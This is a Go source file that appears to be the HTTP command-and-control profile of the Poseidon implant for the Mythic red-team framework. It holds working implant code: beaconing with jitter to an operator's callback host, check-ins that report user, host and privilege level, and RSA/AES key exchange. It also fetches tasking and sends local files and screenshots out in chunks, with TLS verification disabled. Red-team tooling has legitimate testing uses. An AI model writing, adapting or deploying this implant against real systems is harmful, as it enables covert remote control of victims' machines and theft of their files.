// +build linux darwin
// +build http

package profiles

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
// All variables must be a string so they can be set with ldflags

// callback_host is the callback host
var callback_host string

// callback_port is the callback port
var callback_port string

// killdate is the Killdate
var killdate string

// encrypted_exchange_check is Perform Key Exchange
var encrypted_exchange_check string

// callback_interval is the callback interval in seconds
var callback_interval string

// callback_jitter is Callback Jitter in percent
var callback_jitter string

// headers
var headers string

// AESPSK is the Crypto type
var AESPSK string

// get_uri is the GET request URI
var get_uri string

// post_uri is the POST request URI
var post_uri string

// query_path_name is the name of the query parameter
var query_path_name string
var proxy_host string
var proxy_port string
var proxy_user string
var proxy_pass string
var proxy_bypass string

type C2Default struct {
	BaseURL        string
	PostURI        string
	GetURI         string
	QueryPathName  string
	ProxyURL       string
	ProxyUser      string
	ProxyPass      string
	ProxyBypass    bool
	Interval       int
	Jitter         int
	HeaderList     []structs.HeaderStruct
	ExchangingKeys bool
	ApfellID       string
	UUID           string
	Key            string
	RsaPrivateKey  *rsa.PrivateKey
}

// New creates a new HTTP C2 profile from the package's global variables and returns it
func New() Profile {
	profile := C2Default{
		BaseURL:       fmt.Sprintf("%s:%s/", callback_host, callback_port),
		PostURI:       post_uri,
		GetURI:        get_uri,
		QueryPathName: query_path_name,
		ProxyUser:     proxy_user,
		ProxyPass:     proxy_pass,
		ApfellID:      UUID,
		UUID:          UUID,
		Key:           AESPSK,
	}

	// Convert sleep from string to integer
	i, err := strconv.Atoi(callback_interval)
	if err == nil {
		profile.Interval = i
	} else {
		profile.Interval = 10
	}

	// Convert jitter from string to integer
	j, err := strconv.Atoi(callback_jitter)
	if err == nil {
		profile.Jitter = j
	} else {
		profile.Jitter = 23
	}

	// Add HTTP Headers
	json.Unmarshal([]byte(headers), &profile.HeaderList)

	// Add proxy info if set
	if len(proxy_host) > 3 {
		profile.ProxyURL = fmt.Sprintf("%s:%s/", proxy_host, proxy_port)

		if len(proxy_user) > 0 && len(proxy_pass) > 0 {
			profile.ProxyUser = proxy_user
			profile.ProxyPass = proxy_pass
		}
	}

	// Convert ignore_proxy from string to bool
	profile.ProxyBypass, _ = strconv.ParseBool(proxy_bypass)

	if encrypted_exchange_check == "T" {
		profile.ExchangingKeys = true
	}

	return &profile
}

func (c C2Default) getSleepTime() int {
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c C2Default) SleepInterval() int {
	return c.getSleepTime()
}

func (c *C2Default) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c *C2Default) SetSleepJitter(jitter int) {
	c.Jitter = jitter
}

func (c C2Default) ApfID() string {
	return c.ApfellID
}

func (c *C2Default) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Default) ProfileType() string {
	t := reflect.TypeOf(c)
	return t.Name()
}

//CheckIn a new agent
func (c *C2Default) CheckIn(ip string, pid int, user string, host string, operatingsystem string, arch string) interface{} {
	var resp []byte
	checkin := structs.CheckInMessage{
		Action:       "checkin",
		IP:           ip,
		OS:           operatingsystem,
		User:         user,
		Host:         host,
		Pid:          pid,
		UUID:         c.UUID,
		Architecture: arch,
	}

	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		c.NegotiateKey()
	}

	raw, _ := json.Marshal(checkin)
	resp = c.htmlPostData(c.PostURI, raw)

	// save the Mythic id
	response := structs.CheckInMessageResponse{}
	err := json.Unmarshal(resp, &response)

	if err != nil {
		//log.Printf("Error in unmarshal:\n %s", err.Error())
	}

	if len(response.ID) != 0 {
		//log.Printf("Saving new UUID: %s\n", response.ID)
		c.ApfellID = response.ID
	}

	return response
}

//NegotiateKey - EKE key negotiation
func (c *C2Default) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return ""
	}

	resp := c.htmlPostData(c.PostURI, raw)
	// Decrypt & Unmarshal the response

	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
		return ""
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		c.ApfellID = sessionKeyResp.UUID // Save the new UUID
	}

	return sessionID
}

//GetTasking - retrieve new tasks
func (c *C2Default) GetTasking() interface{} {
	url := fmt.Sprintf("%s%s", c.BaseURL, c.GetURI)
	request := structs.TaskRequestMessage{}
	request.Action = "get_tasking"
	request.TaskingSize = -1

	raw, err := json.Marshal(request)

	if err != nil {
		//log.Printf("Error unmarshalling: %s", err.Error())
	}

	rawTask := c.htmlGetData(url, raw)

	task := structs.TaskRequestMessageResponse{}
	err = json.Unmarshal(rawTask, &task)

	if err != nil {
		//log.Printf("Error unmarshalling task data: %s", err.Error())
	}

	return task
}

//PostResponse - Post task responses
func (c *C2Default) PostResponse(output []byte, skipChunking bool) []byte {
	endpoint := c.PostURI
	if !skipChunking {
		return c.postRESTResponse(endpoint, output)
	} else {
		return c.htmlPostData(endpoint, output)
	}

}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
	size := len(data)
	const dataChunk = 512000
	r := bytes.NewBuffer(data)
	chunks := uint64(math.Ceil(float64(size) / dataChunk))
	var retData bytes.Buffer
	//log.Println("Chunks: ", chunks)
	for i := uint64(0); i < chunks; i++ {
		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
		dataBuffer := make([]byte, dataPart)

		_, err := r.Read(dataBuffer)
		if err != nil {
			//fmt.Sprintf("Error reading %s: %s", err)
			break
		}

		responseMsg := structs.TaskResponseMessage{}
		responseMsg.Action = "post_response"
		responseMsg.Responses = make([]json.RawMessage, 1)
		responseMsg.Responses[0] = dataBuffer

		dataToSend, err := json.Marshal(responseMsg)
		if err != nil {
			//log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
			return make([]byte, 0)
		}
		ret := c.htmlPostData(urlEnding, dataToSend)
		retData.Write(ret)
	}

	return retData.Bytes()
}

//htmlPostData HTTP POST function
func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
	//log.Println("Sending POST request to url: ", url)
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data")
		sendData = c.encryptMessage(sendData)
	}
	sendData = append([]byte(c.ApfellID), sendData...)             // Prepend the UUID
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendData))
	if err != nil {
		//log.Printf("Error creating new http request: %s", err.Error())
		return make([]byte, 0)
	}
	contentLength := len(sendData)
	req.ContentLength = int64(contentLength)
	for _, val := range c.HeaderList {
		if val.Key == "Host" {
			req.Host = val.Value
		} else {
			req.Header.Set(val.Key, val.Value)
		}

	}
	// loop here until we can get our data to go through properly
	for true {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}

		if len(c.ProxyURL) > 0 {
			proxyURL, _ := url.Parse(c.ProxyURL)
			tr.Proxy = http.ProxyURL(proxyURL)
		} else if !c.ProxyBypass {
			// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
			tr.Proxy = http.ProxyFromEnvironment
		}

		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			req.Header.Add("Proxy-Authorization", basicAuth)
		}

		client := &http.Client{
			Timeout:   30 * time.Second,
			Transport: tr,
		}
		resp, err := client.Do(req)
		if err != nil {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		if resp.StatusCode != 200 {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		raw, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			//log.Println("Error decoding base64 data: ", err.Error())
			return make([]byte, 0)
		}

		if len(raw) < 36 {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		enc_raw := raw[36:] // Remove the Payload UUID
		// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw = c.decryptMessage(enc_raw)
			//log.Println(enc_raw)
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
				continue
			}
		}
		//log.Printf("Raw htmlpost response: %s\n", string(enc_raw))
		return enc_raw
	}
	return make([]byte, 0) //shouldn't get here
}

//htmlGetData - HTTP GET request for data
func (c *C2Default) htmlGetData(requestUrl string, obody []byte) []byte {
	//log.Println("Sending HTML GET request to url: ", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// Add proxy url if set
	if len(c.ProxyURL) > 0 {
		proxyURL, _ := url.Parse(c.ProxyURL)
		tr.Proxy = http.ProxyURL(proxyURL)
	} else if !c.ProxyBypass {
		// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
		tr.Proxy = http.ProxyFromEnvironment
	}

	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: tr,
	}
	var respBody []byte
	var payload []byte
	for true {
		if len(c.Key) > 0 && len(obody) > 0 {
			payload = c.encryptMessage(obody) // Encrypt and then encapsulate the task request
		} else {
			payload = make([]byte, len(obody))
			copy(payload, payload)
		}
		encapbody := append([]byte(c.ApfellID), payload...)     // Prepend the UUID to the body of the request
		encbody := base64.StdEncoding.EncodeToString(encapbody) // Base64 the body

		req, err := http.NewRequest("GET", requestUrl, nil)

		// Add proxy user name and pass if set
		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			req.Header.Add("Proxy-Authorization", basicAuth)
		}

		q := url.Values{}
		q.Add(c.QueryPathName, encbody)

		req.URL.RawQuery = q.Encode()

		if err != nil {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		for _, val := range c.HeaderList {
			if val.Key == "Host" {
				req.Host = val.Value
			} else {
				req.Header.Set(val.Key, val.Value)
			}

		}
		resp, err := client.Do(req)

		if err != nil {
			//time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		if resp.StatusCode != 200 {
			//time.Sleep(time.Duration(c.SleepInterval()) * time.Second)
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		defer resp.Body.Close()

		respBody, _ = ioutil.ReadAll(resp.Body)
		raw, _ := base64.StdEncoding.DecodeString(string(respBody))
		if len(raw) < 36 {
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}
		enc_raw := raw[36:] // Remove the prepended UUID
		if len(c.Key) != 0 {
			enc_raw = c.decryptMessage(enc_raw)
			if len(enc_raw) == 0 {
				time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
				continue
			}
		}
		//log.Printf("Raw htmlget response: %s\n", string(enc_raw))
		return enc_raw
	}
	return make([]byte, 0) //shouldn't get here

}

//SendFile - download a file
func (c *C2Default) SendFile(task structs.Task, params string, ch chan []byte) {
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	fi, err := file.Stat()
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	_, err = file.Read(raw)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error reading file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	_ = file.Close()

	c.SendFileChunks(task, raw, ch)
}

// Get a file

func (c *C2Default) GetFile(r structs.FileRequest, ch chan []byte) ([]byte, error) {

	var byteHolder [][]byte
	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
	fileUploadMsg.Action = "upload"
	fileUploadMsg.FileID = r.FileID
	fileUploadMsg.ChunkSize = 1024000
	fileUploadMsg.ChunkNum = 1
	fileUploadMsg.FullPath = r.FullPath
	fileUploadMsg.TaskID = r.TaskID

	msg, _ := json.Marshal(fileUploadMsg)
	mu.Lock()
	UploadResponses = append(UploadResponses, msg)
	mu.Unlock()
	// Wait for response from apfell
	rawData := <-ch

	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
	if err != nil {
		return []byte(""), err
	}

	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
	byteHolder = append(byteHolder, decoded)

	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			fileUploadMsg = structs.FileUploadChunkMessage{}
			fileUploadMsg.Action = "upload"
			fileUploadMsg.ChunkNum = index
			fileUploadMsg.ChunkSize = 1024000
			fileUploadMsg.FileID = r.FileID
			fileUploadMsg.FullPath = r.FullPath
			fileUploadMsg.TaskID = r.TaskID

			msg, _ := json.Marshal(fileUploadMsg)
			mu.Lock()
			UploadResponses = append(UploadResponses, msg)
			mu.Unlock()
			rawData := <-ch
			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
			if err != nil {
				return []byte(""), err
			}
			// Base64 decode the chunk data
			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
			byteHolder = append(byteHolder, decoded)
		}
	}
	results := bytes.Join(byteHolder, []byte(""))

	//
	//resp := structs.Response{}
	//resp.UserOutput = "File upload complete"
	//resp.Completed = true
	//resp.TaskID = task.TaskID
	//encResp, err := json.Marshal(resp)
	//mu.Lock()
	//TaskResponses = append(TaskResponses, encResp)
	//mu.Unlock()
	return results, nil
}

//SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte, ch chan []byte) {

	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileDownloadInitialMessage{}
	chunkResponse.NumChunks = int(chunks)
	chunkResponse.TaskID = task.TaskID

	abspath, _ := filepath.Abs(task.Params)

	chunkResponse.FullPath = abspath

	chunkResponse.IsScreenshot = strings.Compare(task.Command, "screencapture") == 0

	msg, _ := json.Marshal(chunkResponse)
	mu.Lock()
	TaskResponses = append(TaskResponses, msg)
	mu.Unlock()

	var fileDetails map[string]interface{}
	// Wait for a response from the channel

	for {
		resp := <-ch
		err := json.Unmarshal(resp, &fileDetails)
		if err != nil {
			errResponse := structs.Response{}
			errResponse.Completed = true
			errResponse.TaskID = task.TaskID
			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
			errResponseEnc, _ := json.Marshal(errResponse)

			mu.Lock()
			TaskResponses = append(TaskResponses, errResponseEnc)
			mu.Unlock()
			return
		}

		//log.Printf("Receive file download registration response %s\n", resp)
		if _, ok := fileDetails["file_id"]; ok {
			if ok {
				//log.Println("Found response with file_id key ", fileid)
				break
			} else {
				//log.Println("Didn't find response with file_id key")
				continue
			}
		}
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	//time.Sleep(time.Duration(c.getSleepTime()) * time.Second)

	for i := uint64(0); i < chunks; i++ {
		//log.Println("Index ", i)
		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		_, _ = r.Read(partBuffer)

		msg := structs.FileDownloadChunkMessage{}
		msg.ChunkNum = int(i) + 1
		msg.FileID = fileDetails["file_id"].(string)
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.TaskID = task.TaskID

		encmsg, _ := json.Marshal(msg)
		mu.Lock()
		TaskResponses = append(TaskResponses, encmsg)
		mu.Unlock()

		// Wait for a response for our file chunk
		var postResp map[string]interface{}
		for {
			decResp := <-ch
			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk

			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
				errResponseEnc, _ := json.Marshal(errResponse)
				mu.Lock()
				TaskResponses = append(TaskResponses, errResponseEnc)
				mu.Unlock()
				return
			}

			//log.Printf("Received chunk download response %s\n", decResp)
			if _, ok := postResp["status"]; ok {
				if ok {
					//log.Println("Found response with status key: ", status)
					break
				} else {
					//log.Println("Didn't find response with status key")
					continue
				}
			}
		}

		if !strings.Contains(postResp["status"].(string), "success") {
			// If the post was not successful, wait and try to send it one more time

			mu.Lock()
			TaskResponses = append(TaskResponses, encmsg)
			mu.Unlock()
		}

		time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
	}

	r.Reset()
	r = nil
	fileData = nil

	final := structs.Response{}
	final.Completed = true
	final.TaskID = task.TaskID
	final.UserOutput = "file downloaded"
	finalEnc, _ := json.Marshal(final)
	mu.Lock()
	TaskResponses = append(TaskResponses, finalEnc)
	mu.Unlock()
	return
}

func (c *C2Default) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Default) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
